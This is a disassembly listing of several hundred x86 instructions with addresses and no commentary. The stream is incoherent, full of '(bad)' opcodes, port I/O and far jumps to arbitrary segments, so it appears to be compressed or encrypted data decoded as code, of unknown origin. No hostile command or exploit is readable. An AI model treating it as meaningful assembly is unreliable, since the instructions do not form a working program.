  407b2d:	xchg   esi,eax
  407b2e:	sub    DWORD PTR [bp+di+0x3339],esp
  407b33:	imul   ebx,DWORD PTR [ebp+0x62],0x6e3e5209
  407b3a:	xchg   esp,eax
  407b3b:	and    eax,0xca0d785e
  407b40:	jne    0x407ba2
  407b42:	dec    edi
  407b43:	xor    al,0xbb
  407b45:	aad    0x67
  407b47:	or     eax,0xa881e818
  407b4c:	inc    esi
  407b4d:	clc    
  407b4e:	sti    
  407b4f:	pop    edi
  407b50:	sub    al,0xe6
  407b52:	shr    dh,1
  407b54:	jbe    0x407adf
  407b56:	push   ebp
  407b57:	enter  0xaceb,0x34
  407b5b:	add    BYTE PTR [edx],dh
  407b5d:	push   esi
  407b5e:	js     0x407b5b
  407b60:	mov    BYTE PTR [edx+0x5aa9f16],bl
  407b66:	inc    ebp
  407b67:	(bad)  
  407b68:	in     al,0x48
  407b6a:	pop    eax
  407b6b:	cmp    eax,0x610cf17
  407b70:	or     BYTE PTR [ecx],bh
  407b72:	pop    edi
  407b73:	aaa    
  407b74:	into   
  407b75:	jl     0x407b18
  407b77:	ror    DWORD PTR [esp+eax*2-0x74],cl
  407b7b:	push   ebp
  407b7c:	push   ss
  407b7d:	test   ecx,eax
  407b7f:	jo     0x407b89
  407b81:	daa    
  407b82:	aam    0xc3
  407b84:	dec    ebp
  407b85:	(bad)  
  407b87:	adc    cl,0x31
  407b8a:	and    DWORD PTR [edx+0x5d],eax
  407b8d:	xor    esp,eax
  407b8f:	xchg   BYTE PTR [ebp+0x1],dl
  407b92:	adc    al,0x89
  407b94:	in     al,dx
  407b95:	push   ebx
  407b96:	push   esp
  407b97:	test   BYTE PTR [esi-0x77],bl
  407b9a:	sti    
  407b9b:	xlat   BYTE PTR ds:[ebx]
  407b9c:	add    BYTE PTR [eax],dh
  407b9e:	daa    
  407b9f:	ds inc esi
  407ba1:	leave  
  407ba2:	int    0x89
  407ba4:	mov    ch,0xbf
  407ba6:	nop
  407ba7:	mov    ds:0x28104dfe,eax
  407bac:	mov    edx,0x72b76117
  407bb1:	sub    al,0xea
  407bb3:	jg     0x407bfe
  407bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bb6:	stc    
  407bb7:	stos   DWORD PTR es:[edi],eax
  407bb8:	jb     0x407bcd
  407bba:	jnp    0x407ba0
  407bbc:	cmc    
  407bbd:	pop    eax
  407bbe:	sbb    DWORD PTR [esi-0x51],ebx
  407bc1:	(bad)  
  407bc2:	sbb    ebx,DWORD PTR [ecx]
  407bc4:	shl    ecx,cl
  407bc6:	repz and al,BYTE PTR [esi+edi*8]
  407bca:	aas    
  407bcb:	xchg   esp,eax
  407bcc:	imul   ecx,DWORD PTR [edi],0xffffffc8
  407bcf:	pop    ecx
  407bd0:	xlat   BYTE PTR ds:[ebx]
  407bd1:	mov    DWORD PTR [esi],esp
  407bd3:	pusha  
  407bd4:	ja     0x407c13
  407bd6:	nop
  407bd7:	leave  
  407bd8:	loopne 0x407bdc
  407bda:	retf   0x773d
  407bdd:	popa   
  407bde:	and    DWORD PTR [edi+0x2d],edi
  407be1:	and    al,0x50
  407be3:	aam    0xe4
  407be5:	out    dx,al
  407be6:	pusha  
  407be7:	mov    dh,0xa3
  407be9:	and    BYTE PTR [edi-0x1089abfa],dh
  407bef:	pop    esi
  407bf0:	lods   eax,DWORD PTR ds:[esi]
  407bf1:	gs pop esp
  407bf3:	jl     0x407be6
  407bf5:	push   edi
  407bf6:	mov    dl,0x73
  407bf8:	jmp    0xe3e6:0x9386d555
  407bff:	ja     0x407bdc
  407c01:	xchg   ebp,eax
  407c02:	mov    edx,es
  407c04:	loop   0x407b86
  407c06:	xchg   edx,ecx
  407c08:	scas   al,BYTE PTR es:[edi]
  407c09:	dec    edx
  407c0a:	mov    WORD PTR [eax-0x6da129ec],cs
  407c10:	mov    bh,0xa3
  407c12:	push   ecx
  407c13:	cmp    BYTE PTR [esi-0x1ecc3041],dl
  407c19:	xchg   edi,eax
  407c1a:	retf   0x581b
  407c1d:	rcl    ebp,cl
  407c1f:	jecxz  0x407c39
  407c21:	enter  0x9ba2,0xfe
  407c25:	jbe    0x407c87
  407c27:	or     edx,DWORD PTR [ecx+0xd]
  407c2a:	dec    esp
  407c2b:	loop   0x407ca9
  407c2d:	(bad)  
  407c2e:	in     al,0x8b
  407c30:	(bad)  
  407c31:	lock jmp 0xbc33c514
  407c37:	inc    eax
  407c38:	sub    eax,0xf47fd9e0
  407c3d:	dec    esi
  407c3e:	add    dh,BYTE PTR [ebx+0x4c81b00e]
  407c44:	xor    al,0xea
  407c46:	jo     0x407cbf
  407c48:	loop   0x407c03
  407c4a:	add    dl,BYTE PTR [ebx-0x290d6605]
  407c50:	std    
  407c51:	sar    BYTE PTR [ebp-0x33],1
  407c54:	cmp    al,0xe2
  407c56:	xchg   ebx,eax
  407c57:	js     0x407bfb
  407c59:	out    dx,eax
  407c5a:	mov    al,ds:0x9091b3f2
  407c5f:	aad    0xe4
  407c61:	mov    ?,WORD PTR ds:0x5e3ed651
  407c67:	and    eax,0xf4799636
  407c6c:	and    bl,BYTE PTR [eax-0x59c9a628]
  407c72:	jl     0x407c4d
  407c74:	sbb    al,0x9c
  407c76:	sub    dh,BYTE PTR [esi]
  407c78:	inc    edi
  407c79:	add    BYTE PTR [ebx-0x3],bl
  407c7c:	dec    edi
  407c7d:	cmp    al,0x6f
  407c7f:	call   0xfece:0x795a4806
  407c86:	inc    ebp
  407c87:	int3   
  407c88:	xchg   DWORD PTR [edi],ebx
  407c8a:	mov    ebx,0xaa214427
  407c8f:	stos   BYTE PTR es:[edi],al
  407c90:	repz cmp ebp,DWORD PTR [ebp-0x1f]
  407c94:	xchg   esi,eax
  407c95:	(bad)  
  407c96:	into   
  407c97:	pop    esi
  407c98:	lods   al,BYTE PTR ds:[esi]
  407c99:	xchg   edx,eax
  407c9a:	and    al,0xc9
  407c9c:	scas   eax,DWORD PTR es:[edi]
  407c9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c9e:	xor    ebp,esp
  407ca0:	add    esp,esp
  407ca2:	clc    
  407ca3:	outs   dx,BYTE PTR ds:[esi]
  407ca4:	inc    edx
  407ca5:	push   edx
  407ca6:	js     0x407cc5
  407ca8:	(bad)  
  407ca9:	mov    bh,0x81
  407cab:	adc    BYTE PTR [edx-0x2e],dh
  407cae:	and    eax,0x9086fc79
  407cb3:	es popf 
  407cb5:	call   0xc2166deb
  407cba:	(bad)  
  407cbb:	mov    esp,cs
  407cbd:	and    BYTE PTR [eax],bl
  407cbf:	sbb    BYTE PTR [esi-0x20],ah
  407cc2:	mov    al,0x80
  407cc4:	mov    ebp,0xc2f13a09
  407cc9:	pushf  
  407cca:	lea    ecx,[edx-0x6d4dcba1]
  407cd0:	and    dl,BYTE PTR [esi-0x7f]
  407cd3:	lea    esp,[edi-0x18cf1d33]
  407cd9:	xchg   edi,eax
  407cda:	scas   eax,DWORD PTR es:[edi]
  407cdb:	popa   
  407cdc:	aam    0x38
  407cde:	xchg   ebx,eax
  407cdf:	shl    DWORD PTR [esp+edx*8+0x73d33240],1
  407ce6:	mov    al,ds:0x3640877c
  407ceb:	sub    al,BYTE PTR [edx+0x2ddeb133]
  407cf1:	cmp    esi,DWORD PTR [eax]
  407cf3:	or     dl,al
  407cf5:	dec    edx
  407cf6:	mov    ds:0xde53125e,al
  407cfb:	in     al,dx
  407cfc:	sahf   
  407cfd:	pop    DWORD PTR [ebp-0x464744c2]
  407d03:	std    
  407d04:	or     esi,ebp
  407d06:	pop    es
  407d07:	xchg   edi,eax
  407d08:	lahf   
  407d09:	jne    0x407caf
  407d0b:	jge    0x407cb4
  407d0d:	rcr    BYTE PTR [esi-0x6f22fbcb],0x7a
  407d14:	push   es
  407d15:	aaa    
  407d16:	or     ebx,DWORD PTR [esp+ebx*1]
  407d19:	sub    eax,0x351e2add
  407d1e:	pop    eax
  407d1f:	mov    cl,0xa2
  407d21:	test   DWORD PTR [edi],edx
  407d23:	mov    ebp,0x504ea1fc
  407d28:	outs   dx,BYTE PTR ds:[esi]
  407d29:	cld    
  407d2a:	cmp    bh,bl
  407d2c:	lods   al,BYTE PTR ds:[esi]
  407d2d:	sub    BYTE PTR [esi-0x13],dh
  407d30:	sub    al,0xef
  407d32:	pop    edx
  407d33:	mov    ch,0x36
  407d35:	enter  0xbe4c,0x49
  407d39:	xor    esp,ecx
  407d3b:	sub    al,0x2
  407d3d:	lds    ebx,FWORD PTR [edx+0x7b0c97d1]
  407d43:	mov    al,ds:0xba469b6e
  407d48:	lods   al,BYTE PTR ds:[esi]
  407d49:	dec    esi
  407d4a:	inc    esi
  407d4b:	setnp  bl
  407d4e:	dec    eax
  407d4f:	loop   0x407d5d
  407d51:	mov    eax,ds:0xc7b24883
  407d56:	xchg   ebp,eax
  407d57:	push   0xd
  407d59:	(bad)  
  407d5a:	nop
  407d5b:	shr    DWORD PTR [ecx+0x44],cl
  407d5e:	mov    ds:0xd1196c3d,al
  407d63:	pop    ebx
  407d64:	adc    esp,esi
  407d66:	xchg   esi,eax
  407d67:	mov    esi,0x7308ffe5
  407d6c:	idiv   DWORD PTR [esi-0x19b8c1d9]
  407d72:	and    ch,cl
  407d74:	add    eax,0xf04b3294
  407d79:	pusha  
  407d7a:	call   0x5a7b:0xa932a5be
  407d81:	mov    WORD PTR [ecx-0x7f8b3278],?
  407d87:	push   ebx
  407d88:	and    DWORD PTR [ebx+0x77],ecx
  407d8b:	in     eax,0x37
  407d8d:	xchg   esp,eax
  407d8e:	aad    0xbe
  407d90:	or     BYTE PTR [ebx-0x3d22fa17],cl
  407d96:	jns    0x407d79
  407d98:	cs push ecx
  407d9a:	std    
  407d9b:	stos   DWORD PTR es:[edi],eax
  407d9c:	shl    BYTE PTR [ecx-0x4607adc2],cl
  407da2:	sti    
  407da3:	mov    ecx,0x979ed4c2
  407da8:	jge    0x407e0d
  407daa:	inc    esi
  407dab:	loopne 0x407e10
  407dad:	sbb    BYTE PTR [edx-0x6d],al
  407db0:	cmp    al,0x17
  407db2:	sbb    eax,esp
  407db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407db5:	(bad)  
  407db6:	out    0x30,al
  407db8:	iret   
  407db9:	in     al,0x5e
  407dbb:	imul   esp,DWORD PTR [esi-0x13],0x23d6ce1b
  407dc2:	mov    ebp,0x1fd083d9
  407dc7:	and    al,ch
  407dc9:	repnz ss in eax,0xf5
  407dcd:	sbb    DWORD PTR [eax+0x2aced32e],ebx
  407dd3:	pop    esp
  407dd4:	sbb    DWORD PTR [esi],eax
  407dd6:	xlat   BYTE PTR ds:[ebx]
  407dd7:	rol    DWORD PTR [edx],cl
  407dd9:	push   0x537ad1c2
  407dde:	repnz cs add eax,0x3b3269a9
  407de5:	adc    ecx,DWORD PTR [ebx]
  407de7:	or     ebx,ebp
  407de9:	fwait
  407dea:	nop
  407deb:	dec    esp
  407dec:	test   DWORD PTR [ebp-0x1b],esi
  407def:	mov    edx,0x34a7111a
  407df4:	inc    edx
  407df5:	or     dl,BYTE PTR [edi+ebp*1]
  407df8:	(bad)  
  407df9:	div    BYTE PTR [ebx]
  407dfb:	into   
  407dfc:	lds    ebx,FWORD PTR [ebx-0x7cdcb7a5]
  407e02:	mov    ebp,0xa8d4f24e
  407e07:	xor    ebp,DWORD PTR [edx-0x79]
  407e0a:	enter  0xc438,0x2b
  407e0e:	mov    bl,0x29
  407e10:	in     al,dx
  407e11:	xchg   esi,eax
  407e12:	or     al,0x5
  407e14:	mov    ecx,0xdc118a27
  407e19:	or     ch,BYTE PTR [esi+0x595fca11]
  407e1f:	push   edx
  407e20:	xchg   ecx,eax
  407e21:	push   edx
  407e22:	cli    
  407e23:	add    eax,0xe87e3cf1
  407e28:	and    ebx,ecx
  407e2a:	or     al,0x70
  407e2c:	adc    al,0x67
  407e2e:	push   eax
  407e2f:	fbstp  TBYTE PTR [edx+eax*1]
  407e32:	scas   al,BYTE PTR es:[edi]
  407e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e34:	data16 jnp 0x407e01
  407e37:	int3   
  407e38:	and    ecx,DWORD PTR ds:0x27e145f0
  407e3e:	dec    ecx
  407e3f:	ror    BYTE PTR ds:0xafaf63d4,0x4
  407e46:	push   0x13
  407e48:	or     al,0x74
  407e4a:	test   al,0xc3
  407e4c:	rcl    BYTE PTR [ecx],1
  407e4e:	mov    dl,0x60
  407e50:	outs   dx,BYTE PTR ds:[esi]
  407e51:	sub    DWORD PTR ds:0xb70ba44c,0x7f
  407e58:	ficom  WORD PTR [ebx-0x7a]
  407e5b:	stos   BYTE PTR es:[edi],al
  407e5c:	and    al,0xa3
  407e5e:	jnp    0x407e88
  407e60:	xchg   ebx,eax
  407e61:	sahf   
  407e62:	(bad)  
  407e63:	out    0xfa,al
  407e65:	inc    esp
  407e66:	aad    0xed
  407e68:	pop    ecx
  407e69:	mov    dh,0x2
  407e6b:	adc    edi,DWORD PTR [ebx]
  407e6d:	mov    ds:0x965e2269,eax
  407e72:	daa    
  407e73:	sbb    BYTE PTR [edi-0x59],al
  407e76:	pop    esi
  407e77:	bound  ebx,QWORD PTR [ebp+ebp*1+0x4f7cf920]
  407e7e:	lods   eax,DWORD PTR ds:[esi]
  407e7f:	mov    BYTE PTR [esi-0x5c],dh
  407e82:	adc    DWORD PTR [ecx],edi
  407e84:	jmp    0x407e24
  407e86:	loope  0x407edb
  407e88:	cs and al,0x1f
  407e8b:	sbb    DWORD PTR [edi+0x47512339],ebx
  407e91:	arpl   WORD PTR [ebx+0x6090a77c],sp
  407e97:	jecxz  0x407e72
  407e99:	(bad)  
  407e9a:	cmp    bl,ch
  407e9c:	and    al,0xe3
  407e9e:	loopne 0x407e9e
  407ea0:	mov    ebx,0x1de9047b
  407ea5:	(bad)  
  407ea6:	fdivr  QWORD PTR [ebx+0x6c]
  407ea9:	ins    DWORD PTR es:[edi],dx
  407eaa:	mov    esi,0xb2012035
  407eaf:	add    ch,BYTE PTR [esi-0x8]
  407eb2:	jae    0x407e57
  407eb4:	dec    edi
  407eb5:	sub    dh,BYTE PTR [ebx]
  407eb7:	push   ds
  407eb8:	out    0x22,al
  407eba:	push   edx
  407ebb:	mov    ds:0x7fd62460,al
  407ec0:	add    BYTE PTR [eax+eiz*1],0x65
  407ec4:	hlt    
  407ec5:	(bad)  
  407ec6:	cmp    ecx,edi
  407ec8:	inc    esi
  407ec9:	retf   0x4629
  407ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ecd:	pushf  
  407ece:	adc    eax,0x7a5cc192
  407ed3:	not    BYTE PTR [edx]
  407ed5:	pop    es
  407ed6:	jne    0x407f28
  407ed8:	data16 jb 0x407e9f
  407edb:	ds sbb edi,ecx
  407ede:	add    esp,DWORD PTR [ebp-0x46]
  407ee1:	mov    ds:0xbc51bcd9,al
  407ee6:	or     DWORD PTR [ebp+0x5782aedb],esp
  407eec:	xchg   ebp,eax
  407eed:	das    
  407eee:	cmc    
  407eef:	mov    bh,0xaa
  407ef1:	jecxz  0x407f1d
  407ef3:	rol    edi,1
  407ef5:	jae    0x407f4d
  407ef7:	xchg   esi,eax
  407ef8:	mov    bh,al
  407efa:	mov    dh,0x4f
  407efc:	fdivr  QWORD PTR [ebx]
  407efe:	lds    edi,FWORD PTR [edi+0x29]
  407f01:	pop    edi
  407f02:	dec    ebx
  407f03:	(bad)  
  407f04:	jmp    0xd198:0x53ebb6cc
  407f0b:	add    DWORD PTR [ebx],ebp
  407f0d:	js     0x407f65
  407f0f:	scas   al,BYTE PTR es:[edi]
  407f10:	lock ins BYTE PTR es:[edi],dx
  407f12:	inc    esp
  407f13:	mov    edx,DWORD PTR [edx-0x34c8bd06]
  407f19:	push   0xffffffe5
  407f1b:	pop    ebx
  407f1c:	scas   al,BYTE PTR es:[edi]
  407f1d:	or     al,0xb9
  407f1f:	or     dh,bh
  407f21:	iret   
  407f22:	out    dx,al
  407f23:	out    dx,eax
  407f24:	push   ebp
  407f25:	jo     0x407f7b
  407f27:	inc    edi
  407f28:	mov    ecx,0xbb6c0099
  407f2d:	dec    edx
  407f2e:	mov    DWORD PTR [esi],esp
  407f30:	jge    0x407eb5
  407f32:	mov    eax,ds:0xb2773b42
  407f37:	cmp    al,0x8d
  407f39:	shl    BYTE PTR [edi-0x76],0xc2
  407f3d:	fsubr  st,st(1)
  407f3f:	pushf  
  407f40:	sub    eax,0xc99be785
  407f45:	pop    es
  407f46:	add    ecx,DWORD PTR [ecx]
  407f48:	fwait
  407f49:	scas   eax,DWORD PTR es:[edi]
  407f4a:	add    al,0xa9
  407f4c:	or     eax,0x7337e9a1
  407f51:	fimul  WORD PTR [ebx-0x5b]
  407f54:	das    
  407f55:	arpl   WORD PTR [eax],bx
  407f57:	jne    0x407fd5
  407f59:	enter  0xa0bd,0xeb
  407f5d:	(bad)  
  407f5e:	sar    DWORD PTR [esi+eax*8],1
  407f61:	add    DWORD PTR [esp+esi*8-0x14d83cd0],edi
  407f68:	xchg   ecx,eax
  407f69:	loope  0x407f19
  407f6b:	loope  0x407fc6
  407f6d:	lods   al,BYTE PTR ds:[esi]
  407f6e:	mov    ebx,DWORD PTR [esi]
  407f70:	test   esp,0xae3282b9
  407f76:	xchg   ebp,eax
  407f77:	mov    eax,ds:0xdf54849c
  407f7c:	push   edx
  407f7d:	push   ebp
  407f7e:	out    dx,eax
  407f7f:	(bad)  
  407f80:	pop    esp
  407f81:	in     al,0x33
  407f83:	jg     0x407f0c
  407f85:	jbe    0x407fe2
  407f87:	test   BYTE PTR [ebx],al
  407f89:	mov    bh,0x7d
  407f8b:	cwde   
  407f8c:	test   cl,dh
  407f8e:	adc    eax,0x473d79d7
  407f93:	mov    bh,0xfb
  407f95:	jbe    0x407f27
  407f97:	jmp    0x407fae
  407f99:	add    BYTE PTR [esi-0x65],bh
  407f9c:	mov    dl,0xab
  407f9e:	pop    esi
  407f9f:	mov    esp,0xf8ecb412
  407fa4:	sbb    BYTE PTR [ecx-0x116f1d88],dl
  407faa:	iret   
  407fab:	add    DWORD PTR [eax],0xdea9f762
  407fb1:	retf   
  407fb2:	jnp    0x407f7a
  407fb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fb5:	mov    eax,ds:0x40654ad5
  407fba:	sub    eax,0xe2ebea0f
  407fbf:	cmp    eax,0xb2de9753
  407fc4:	leave  
  407fc5:	mov    esi,0x4f68bf0d
  407fca:	iret   
  407fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fcc:	sahf   
  407fcd:	popa   
  407fce:	xchg   ebx,eax
  407fcf:	aaa    
  407fd0:	dec    ebp
  407fd1:	adc    al,0x5
  407fd3:	fcom   st(0)
  407fd5:	add    DWORD PTR ds:0x5e614bf3,eax
  407fdb:	mov    ds:0x211debe1,al
  407fe0:	xchg   ebx,eax
  407fe1:	push   0x5203db54
  407fe6:	xor    DWORD PTR [ecx+0x4dc2d78a],edi
  407fec:	repnz pop ebx
  407fee:	mov    dl,0xce
  407ff0:	adc    eax,0x61562d4b
  407ff5:	pop    edi
  407ff6:	dec    ebx
  407ff7:	inc    esp
  407ff8:	cmp    al,0xf
  407ffa:	jmp    0xb871:0x3aeac176
  408001:	or     ah,BYTE PTR [edx-0x33395f10]
  408007:	ins    BYTE PTR es:[edi],dx
  408008:	mov    eax,0x389ba972
  40800d:	jns    0x408046
  40800f:	imul   ecx,DWORD PTR [edi+0x6e77aac6],0x44
  408016:	push   DWORD PTR [eax]
  408018:	push   ebx
  408019:	mov    ebp,0xe11e9ade
  40801e:	sub    BYTE PTR [ecx+eax*8+0x39],al
  408022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408023:	sahf   
  408024:	leave  
  408025:	stc    
  408026:	fist   WORD PTR [eax-0x70ef6535]
  40802c:	repnz pop edi
  40802e:	stos   DWORD PTR es:[edi],eax
  40802f:	sbb    al,0x47
  408031:	jne    0x40801f
  408033:	bound  ebp,QWORD PTR [eax+0x6]
  408036:	imul   esp,DWORD PTR [ebp-0x6e],0x6d449060
  40803d:	push   ebp
  40803e:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  408040:	push   ebp
  408041:	xor    eax,0xa5e1c614
  408046:	rol    cl,1
  408048:	repnz and BYTE PTR [ebx],0xd0
  40804c:	fldenv [esp+esi*8+0x0]
  408050:	ja     0x408054
  408052:	sti    
  408053:	hlt    
  408054:	(bad)  
  408055:	in     eax,0x2b
  408057:	dec    bp
  408059:	test   DWORD PTR [esi-0x80],ebx
  40805c:	pop    esi
  40805d:	jl     0x408092
  40805f:	lea    ecx,[ecx-0x16fc8165]
  408065:	fsubr  st,st(4)
  408067:	js     0x4080c1
  408069:	sti    
  40806a:	cdq    
  40806b:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40806d:	loope  0x4080e6
  40806f:	pop    ds
  408070:	hlt    
  408071:	ret    
  408072:	or     DWORD PTR [eax],esp
  408074:	lods   eax,DWORD PTR ds:[esi]
  408075:	add    DWORD PTR [ecx+0x1f318fd9],ebp
  40807b:	mov    al,BYTE PTR [esi+eiz*1]
  40807e:	ss sbb ah,BYTE PTR ds:[esi+0x49]
  408083:	int    0x41
  408085:	test   bl,dl
  408087:	adc    BYTE PTR [eax-0x38],0x7f
  40808b:	pop    edi
  40808c:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40808e:	inc    ebp
  40808f:	outs   dx,DWORD PTR ds:[esi]
  408090:	pop    ebx
  408091:	push   esi
  408092:	and    DWORD PTR [edi+0x5c2c0d6e],ebp
  408098:	pop    edi
  408099:	xchg   DWORD PTR [eax-0x1b],eax
  40809c:	adc    cl,bl
  40809e:	out    dx,al
  40809f:	dec    esi
  4080a0:	hlt    
  4080a1:	dec    ebx
  4080a2:	int3   
  4080a3:	fnstsw WORD PTR [ebx+eax*4]
  4080a6:	popa   
  4080a7:	pop    edi
  4080a8:	sub    bh,0x94
  4080ab:	neg    edx
  4080ad:	ror    BYTE PTR [ebx-0x37],0x9f
  4080b1:	sub    esp,ebx
  4080b3:	inc    eax
  4080b4:	adc    esp,DWORD PTR [ebx-0x2]
  4080b7:	jge    0x4080d0
  4080b9:	(bad)  
  4080ba:	stos   BYTE PTR es:[edi],al
  4080bb:	fidivr DWORD PTR [eax-0x3ad1ca6]
  4080c1:	pop    eax
  4080c2:	aaa    
  4080c3:	mov    eax,0xb04a932d
  4080c8:	call   0xb72f:0xbe980668
  4080cf:	jmp    0xb152:0xe1baba52
  4080d6:	push   es
  4080d7:	xchg   edx,eax
  4080d8:	jns    0x40808a
  4080da:	loop   0x4080f0
  4080dc:	cs mov ch,0x9
  4080df:	cdq    
  4080e0:	push   ebx
  4080e1:	lods   eax,DWORD PTR ds:[esi]
  4080e2:	imul   BYTE PTR [edi+0x49b9c962]
  4080e8:	jns    0x4080d5
  4080ea:	push   ss
  4080eb:	mov    cl,0xce
  4080ed:	xor    al,0xd9
  4080ef:	out    0xd7,al
  4080f1:	shr    BYTE PTR [eax-0x4c963bb7],0x77
  4080f8:	cmp    al,0x55
  4080fa:	dec    edx
  4080fb:	xor    BYTE PTR [edi-0x39],bh
  4080fe:	add    ch,BYTE PTR [ebx-0x4400f10]
  408104:	arpl   di,si
  408106:	jns    0x4080d7
  408108:	jbe    0x40817e
  40810a:	ds stos DWORD PTR es:[edi],eax
  40810c:	outs   dx,DWORD PTR ds:[esi]
  40810d:	in     eax,dx
  40810e:	daa    
  40810f:	pop    edi
  408110:	in     eax,0x5c
  408112:	(bad)  
  408113:	jns    0x4080e5
  408115:	call   0x8f61:0x5fd2ce63
  40811c:	add    dh,dl
  40811e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40811f:	cmp    BYTE PTR [edx-0x3f12e87c],al
  408125:	jmp    0x4080da
  408127:	lods   eax,DWORD PTR ds:[esi]
  408128:	mov    edi,0xb6040e64
  40812d:	mov    edi,0xa6451f58
  408132:	xchg   ecx,eax
  408133:	fld1   
  408135:	fmulp  st(4),st
  408137:	outs   dx,BYTE PTR ds:[esi]
  408138:	nop
  408139:	(bad)  
  40813a:	fsubr  QWORD PTR [ecx+ebp*8-0x7c]
  40813e:	loop   0x40819b
  408140:	mov    ah,0x3a
  408142:	push   edi
  408143:	(bad)  
  408144:	cmp    al,0x89
  408146:	xchg   esp,eax
  408147:	mov    esi,0xdf7e0ed0
  40814c:	sub    eax,0xcf0c4486
  408151:	pusha  
  408152:	sahf   
  408153:	mov    eax,ds:0x28b521a4
  408158:	in     eax,dx
  408159:	test   BYTE PTR [ecx],al
  40815b:	pop    ds
  40815c:	push   edi
  40815d:	jle    0x408197
  40815f:	cli    
  408160:	fbstp  TBYTE PTR [edi-0x2eb68e9f]
  408166:	pop    ecx
  408167:	sti    
  408168:	lock pop ebx
  40816a:	enter  0xa456,0x49
  40816e:	bound  eax,QWORD PTR [esp+edx*2]
  408171:	push   edi
  408172:	add    DWORD PTR [ebp+ebp*4+0x7e],esp
  408176:	cmp    ebp,DWORD PTR ds:[edi-0x30a29a60]
  40817d:	cld    
  40817e:	out    dx,al
  40817f:	das    
  408180:	inc    edx
  408181:	jp     0x408138
  408183:	fstp   DWORD PTR [ebx+0x24]
  408186:	mov    esp,0xc673c79e
  40818b:	jno    0x408135
  40818d:	mov    dh,0x3a
  40818f:	jns    0x4081fc
  408191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408192:	icebp  
  408193:	jnp    0x4081e9
  408195:	fwait
  408196:	mov    edi,0x3e922395
  40819b:	jmp    0xd7ee367
  4081a0:	adc    ecx,DWORD PTR [edx+0x102492b4]
  4081a6:	repnz and al,0xe7
  4081a9:	mov    ds,WORD PTR [ecx-0xb]
  4081ac:	mov    ecx,0xa5fcd9e5
  4081b1:	(bad)  
  4081b2:	jbe    0x408137
  4081b4:	sbb    cl,BYTE PTR [ebx]
  4081b6:	outs   dx,DWORD PTR ds:[esi]
  4081b7:	ins    BYTE PTR es:[edi],dx
  4081b8:	fdiv   DWORD PTR [ebx+0x76]
  4081bb:	dec    eax
  4081bc:	add    BYTE PTR [esi],cl
  4081be:	sbb    al,0xcf
  4081c0:	inc    ebp
  4081c1:	mov    eax,ds:0x536188be
  4081c6:	mov    ebx,0xff5a87dc
  4081cb:	frstor [edx]
  4081cd:	pushf  
  4081ce:	sub    eax,0x84b913ab
  4081d3:	cld    
  4081d4:	cmp    al,0x16
  4081d6:	mov    ah,0xa6
  4081d8:	xor    BYTE PTR [ecx-0x5c],bh
  4081db:	jmp    esi
  4081dd:	push   esp
  4081de:	pop    esp
  4081df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081e0:	jb     0x408191
  4081e2:	dec    edi
  4081e3:	fidivr WORD PTR [edi+0x35d6d138]
  4081e9:	pop    esp
  4081ea:	rcr    BYTE PTR [edx],0x93
  4081ed:	cdq    
  4081ee:	jo     0x4081dd
  4081f0:	retf   
  4081f1:	mov    eax,ds:0x13aaaa00
  4081f6:	jge    0x4081f4
  4081f8:	add    BYTE PTR [edi-0x465b846b],ah
  4081fe:	or     BYTE PTR [ebx-0x67],ch
  408201:	pop    ebp
  408202:	test   BYTE PTR [esi+0x6ec605a],0x96
  408209:	push   ss
  40820a:	adc    DWORD PTR [esi],ecx
  40820c:	mov    ds,ebx
  40820e:	popa   
  40820f:	jne    0x40827b
  408211:	adc    al,dl
  408213:	mov    dh,0x9
  408215:	pop    eax
  408216:	mov    ecx,0x326c6b13
  40821b:	xchg   BYTE PTR [edx+0x4f],al
  40821e:	shr    BYTE PTR [eax-0x2e],cl
  408221:	mov    BYTE PTR ds:0x528dd14a,dh
  408227:	test   ch,dl
  408229:	inc    edx
  40822a:	aam    0xf8
  40822c:	push   es
  40822d:	add    DWORD PTR [eax-0xce61ef],0x4e291852
  408237:	shr    bl,1
  408239:	push   0xffffffe7
  40823b:	and    DWORD PTR [edi],esi
  40823d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40823f:	and    bh,BYTE PTR [ebx+0x71]
  408242:	mov    al,0xb8
  408244:	dec    ecx
  408245:	mov    edx,0x9c94df1b
  40824a:	jns    0x4082c0
  40824c:	lds    eax,FWORD PTR [edx]
  40824e:	mov    BYTE PTR [edi-0x56],dh
  408251:	sbb    DWORD PTR [esp+ebx*2+0x73],edx
  408255:	out    dx,al
  408256:	add    bh,dh
  408258:	mov    edi,0xe203e7bf
  40825d:	and    eax,DWORD PTR [eax+edi*4-0x3505af69]
  408264:	xor    ebx,0xb0c9b911
  40826a:	sbb    al,0x74
  40826c:	push   ebx
  40826d:	adc    edx,DWORD PTR [ebx-0x5e95b586]
  408273:	sub    ebp,DWORD PTR [edx]
  408275:	xor    dh,BYTE PTR [ebp-0x55207841]
  40827b:	shl    DWORD PTR [esi+0x16],1
  40827e:	push   ecx
  40827f:	shr    DWORD PTR [esi],0x85
  408282:	dec    ebp
  408283:	jb     0x408241
  408285:	xchg   edx,eax
  408286:	(bad)  ds:0xca7a497c
  40828c:	cmp    esp,DWORD PTR [edi-0x7eb4ef08]
  408292:	shl    edi,1
  408294:	(bad)  
  408295:	retf   
  408296:	and    esp,DWORD PTR [esi-0x1d]
  408299:	or     BYTE PTR ds:0x90ef3b53,al
  40829f:	add    ah,dh
  4082a1:	fsubr  st(6),st
  4082a3:	mov    WORD PTR [edx-0x55],fs
  4082a6:	bswap  ebx
  4082a8:	retf   
  4082a9:	fnstenv [esi+0x587b7f67]
  4082af:	pushf  
  4082b0:	or     BYTE PTR [ebx+0xf65d923],bl
  4082b6:	pushf  
  4082b7:	je     0x408278
  4082b9:	das    
  4082ba:	pop    ds
  4082bb:	ret    
